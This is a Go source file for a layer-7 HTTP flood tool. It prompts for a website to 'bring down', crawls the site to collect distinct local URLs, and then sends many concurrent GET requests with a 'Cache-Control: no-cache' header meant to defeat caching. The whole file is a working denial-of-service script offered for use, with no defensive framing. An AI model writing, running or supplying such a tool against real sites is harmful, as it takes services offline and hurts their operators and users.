package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func main() {
	// 1. Get parameters
	website := strings.TrimSuffix(StringPrompt("What website do you want to bring down?"), "/")
	routines := IntPrompt("How many concurrent requests?")
	total := IntPrompt("How many total requests would you like to send?")

	fmt.Printf("\n\nAlright... Let's get %s down. We'll do %d concurrent HTTP calls for a total of %d requests.\n\n", website, routines, total)

	// 2. Capture as many distinct paths as possible
	fmt.Printf("Warming up...\n")
	fmt.Printf("Casually navigating website to capture as many distinct URLs as possible... (this can take a few minutes)\n")
	distinctUrls, err := CasuallyNavigateAndCaptureLinks(website, total)
	if err != nil {
		panic(err)
	}
	fmt.Printf("We've got %d distinct URLs to work with, let's get ready...\n\n", len(distinctUrls))

	// 3. Hit her!
	fmt.Println("GO!")
	Flood(website, distinctUrls, routines, total)

	// 4. Summary
	// TODO
	fmt.Println("")

	fmt.Println("DONE")
}

func StringPrompt(message string) string {
	var s string
	r := bufio.NewReader(os.Stdin)
	for {
		fmt.Fprint(os.Stderr, message+" ")
		s, _ = r.ReadString('\n')
		if s != "" {
			break
		}
	}
	return strings.TrimSpace(s)
}

func IntPrompt(message string) int {
	s := StringPrompt(message)
	i, err := strconv.Atoi(s)
	if err != nil {
		panic("invalid integer")
	}
	return i
}

func CasuallyNavigateAndCaptureLinks(website string, limit int) ([]string, error) {
	distinctUrlsToHit := []string{"/"}

	// Do this for up to 5 minutes (or until we hit limit)
	for start := time.Now(); time.Since(start) < 5*time.Minute; {
		// randomly pick a url from the ones we've captured so far
		urlToHit := fmt.Sprintf("%s%s", website, RandomItem(distinctUrlsToHit))

		linksInPage, err := CaptureLinksFromURL(urlToHit)
		if err != nil {
			panic(err)
		}

		distinctUrlsToHit = MergeSlicesDiscardDups(distinctUrlsToHit, linksInPage)

		// If we've hit limit, stop there
		if len(distinctUrlsToHit) >= limit {
			break
		}
	}

	return distinctUrlsToHit, nil
}

func CaptureLinksFromURL(url string) ([]string, error) {
	startingPageHtmlContent, err := GetPageContent(url, 30, map[string]string{})
	if err != nil {
		return nil, err
	}

	links, err := ExtractLocalLinksFromHtml(startingPageHtmlContent)
	if err != nil {
		return nil, err
	}

	return links, err
}

func GetPageContent(url string, timeout time.Duration, headers map[string]string) (string, error) {
	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: timeout * time.Second,
	}

	// Create and modify HTTP request before sending
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	for headerName, headerValue := range headers {
		request.Header.Set(headerName, headerValue)
	}

	// Make HTTP GET request
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	// Get the response body as a string
	dataInBytes, err := ioutil.ReadAll(response.Body)
	webpage := string(dataInBytes)

	return webpage, nil
}

func ExtractLocalLinksFromHtml(htmlContent string) ([]string, error) {
	links := []string{}

	// Create a goquery document from the HTTP response
	document, err := goquery.NewDocumentFromReader(strings.NewReader(htmlContent))
	if err != nil {
		return nil, err
	}

	// Find all links
	document.Find("a").Each(func(index int, element *goquery.Selection) {
		href, exists := element.Attr("href")
		if exists && strings.HasPrefix(href, "/") {
			links = append(links, href)
		}
	})

	return links, nil
}

func MergeSlicesDiscardDups(slices ...[]string) []string {
	uniqueMap := map[string]bool{}

	for _, slice := range slices {
		for _, str := range slice {
			uniqueMap[str] = true
		}
	}

	// Create a slice with the capacity of unique items
	// This capacity make appending flow much more efficient
	result := make([]string, 0, len(uniqueMap))

	for key := range uniqueMap {
		result = append(result, key)
	}

	return result
}

func RandomItem(slice []string) string {
	rand.Seed(time.Now().UnixNano())
	return slice[rand.Intn(len(slice))]
}

func Flood(website string, distinctUrls []string, concurrency, limit int) {
	var ch = make(chan int, concurrency)
	var wg sync.WaitGroup

	var totalHitsMade = 0

	// Goroutines that wait for something to do
	wg.Add(concurrency)
	for i := 0; i < concurrency; i++ {
		go func() {
			for {
				_, ok := <-ch
				if !ok { // if there is nothing to do and the channel has been closed then end the goroutine
					wg.Done()
					return
				}

				// Do the thing
				for totalHitsMade < limit {
					urlToHit := fmt.Sprintf("%s%s", website, RandomItem(distinctUrls))
					//fmt.Printf("Hitting %s\n", urlToHit)
					_, err := GetPageContent(urlToHit, 30, map[string]string{"Cache-Control": "no-cache"})
					if err != nil {
						fmt.Printf("error hitting %s: %s\n", urlToHit, err)
					}

					totalHitsMade++
				}
			}
		}()
	}

	// Now the jobs can be added to the channel, which is used as a queue
	for i := 0; i < concurrency; i++ {
		ch <- i // add i to the queue
	}

	close(ch) // This tells the goroutines there's nothing else to do

	wg.Wait() // Wait for the threads to finish
}
